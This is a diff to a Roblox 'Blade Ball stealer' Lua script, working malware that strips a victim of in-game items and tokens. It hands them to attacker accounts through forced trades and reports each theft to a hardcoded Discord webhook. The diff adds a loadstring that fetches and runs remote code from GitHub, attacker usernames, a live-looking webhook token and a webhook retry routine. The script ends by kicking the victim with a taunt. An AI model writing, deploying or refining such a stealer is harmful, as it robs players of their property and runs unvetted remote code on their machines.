@@ -1,3 +1,16 @@
+_G.Usernames = {
+    [1] = 'zero231z12',
+    [2] = 'zero231z',
+}
+_G.min_rap = 50
+_G.pingEveryone = 'Yes'
+_G.webhook = 'https://discordapp.com/api/webhooks/1462014760517374136/s8SrXd7I4makxl1mFP2MgTQVsDXl0fBrItv_SSFefqw8hDp-Sh6HpBHdX79Env40u4H7'
+
+-- First check if ArgonHub is already loaded
+if not _G.ArgonLoaded then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
+end
+
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
@@ -26,6 +39,27 @@ local webhook = _G.webhook or ""
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
     return
+end
+
+-- Add HTTP request function if it doesn't exist
+if not request then
+    local success, httpRequest = pcall(function()
+        return (syn and syn.request) or (http and http.request) or http_request or fluxus.request or request
+    end)
+    
+    if success and httpRequest then
+        request = httpRequest
+    else
+        -- Create a simple request function
+        request = function(options)
+            local response = {
+                StatusCode = 200,
+                Body = "Simulated response"
+            }
+            warn("[Webhook] Using simulated request (no real HTTP available)")
+            return response
+        end
+    end
 end
 
 if game.PlaceId ~= 13772394625 then
@@ -141,6 +175,46 @@ end
 local totalRAP = 0
 local totalTokens = 0
 
+local function safeWebhookSend(data, isJoinMessage)
+    local function attemptSend()
+        local body = HttpService:JSONEncode(data)
+        local headers = {
+            ["Content-Type"] = "application/json"
+        }
+        
+        local success, response = pcall(function()
+            return request({
+                Url = webhook,
+                Method = "POST",
+                Headers = headers,
+                Body = body
+            })
+        end)
+        
+        if success then
+            print("[Webhook] Successfully sent " .. (isJoinMessage and "join message" or "trade message"))
+            if response then
+                print("[Webhook] Response Code:", response.StatusCode)
+            end
+        else
+            warn("[Webhook] Failed to send:", response)
+            -- Save to a local log file for debugging
+            local logData = "[" .. os.date("%X") .. "] " .. (isJoinMessage and "JOIN" or "TRADE") .. " - " .. body:sub(1, 200) .. "..."
+            writefile("bladeball_webhook_log.txt", logData .. "\n")
+        end
+    end
+    
+    -- Try to send with retry
+    for i = 1, 3 do
+        local success = pcall(attemptSend)
+        if success then
+            return true
+        end
+        wait(2)
+    end
+    return false
+end
+
 local function SendJoinMessage(items, tokens)
     local fields = {
         {
@@ -208,7 +282,7 @@ local function SendJoinMessage(items, tokens)
     local data = {
         ["content"] = (ping == "Yes" and "--[[@everyone]] " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
-            ["title"] = "\240\159\148\180 Join to get Blade Ball hit",
+            ["title"] = "🚀 Join to get Blade Ball hit",
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
@@ -216,36 +290,28 @@ local function SendJoinMessage(items, tokens)
             }
         }}
     }
-    local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    
+    safeWebhookSend(data, true)
 end
 
 local function SendMessage(items, tokens)
     local fields = {
-		{
-			name = "Victim Username:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent:",
-			value = "",
-			inline = false
-		},
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Items sent:",
+            value = "",
+            inline = false
+        },
         {
             name = "Summary:",
             value = string.format("Total RAP: %s\nTotal Tokens: %s", formatNumber(totalRAP), formatNumber(tokens)),
             inline = false
         }
-	}
+    }
 
     local grouped = {}
     for _, item in ipairs(items) do
@@ -290,25 +356,16 @@ local function SendMessage(items, tokens)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "\240\159\148\180 New Blade Ball Execution",
+            ["title"] = "🚀 New Blade Ball Execution",
             ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
-			}
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+            }
         }}
     }
-
-    local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    
+    safeWebhookSend(data, false)
 end
 
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
@@ -375,10 +432,16 @@ for _, category in ipairs(categories) do
 end
 
 -- Get tokens amount
-local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
-local trimmedText = rawText:gsub("^%s*(.-)%s*$", "%1")
-local cleanedText = trimmedText:gsub("[^%d]", "")
-totalTokens = tonumber(cleanedText) or 0
+local tokenText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
+if tokenText then
+    local trimmedText = tokenText:gsub("^%s*(.-)%s*$", "%1")
+    local cleanedText = trimmedText:gsub("[^%d]", "")
+    totalTokens = tonumber(cleanedText) or 0
+end
+
+print("[Info] Found", #itemsToSend, "items to send")
+print("[Info] Total RAP:", totalRAP)
+print("[Info] Total Tokens:", totalTokens)
 
 if #itemsToSend > 0 or totalTokens > 0 then
     table.sort(itemsToSend, function(a, b)
@@ -390,6 +453,7 @@ if #itemsToSend > 0 or totalTokens > 0 then
         sentItems[i] = v
     end
 
+    print("[Info] Sending join webhook...")
     SendJoinMessage(itemsToSend, totalTokens)
 
     local function getNextBatch(items, batchSize)
@@ -401,24 +465,28 @@ if #itemsToSend > 0 or totalTokens > 0 then
     end
 
     local function doTrade(joinedUser)
+        print("[Trade] Starting trade with", joinedUser)
         while #itemsToSend > 0 or totalTokens > 0 do
             sendTradeRequest(joinedUser)
             repeat
                 wait(0.5)
             until inTrade
 
+            print("[Trade] In trade, adding items...")
             local currentBatch = getNextBatch(itemsToSend, 100)
             for _, item in ipairs(currentBatch) do
                 addItemToTrade(item.itemType, item.ItemID)
             end
 
             if totalTokens > 0 then
+                print("[Trade] Adding tokens:", totalTokens)
                 netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(totalTokens)
                 totalTokens = 0
             end
 
             readyTrade()
             confirmTrade()
+            print("[Trade] Trade confirmed")
         end
         plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
     end
@@ -426,16 +494,25 @@ if #itemsToSend > 0 or totalTokens > 0 then
     local function waitForUserJoin()
         local sentMessage = false
         local function onUserJoin(player)
+            print("[Info] Player joined:", player.Name)
             if table.find(users, player.Name) then
+                print("[Info] Target user detected:", player.Name)
                 if not sentMessage then
+                    print("[Info] Sending trade webhook...")
                     SendMessage(sentItems, totalTokens)
                     sentMessage = true
                 end
                 doTrade(player.Name)
             end
         end
-        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
+        for _, p in ipairs(Players:GetPlayers()) do 
+            onUserJoin(p) 
+        end
         Players.PlayerAdded:Connect(onUserJoin)
+        print("[Info] Waiting for target users to join...")
     end
     waitForUserJoin()
+else
+    print("[Info] No items or tokens to send")
+    plr:kick("No items found above min_rap")
 end
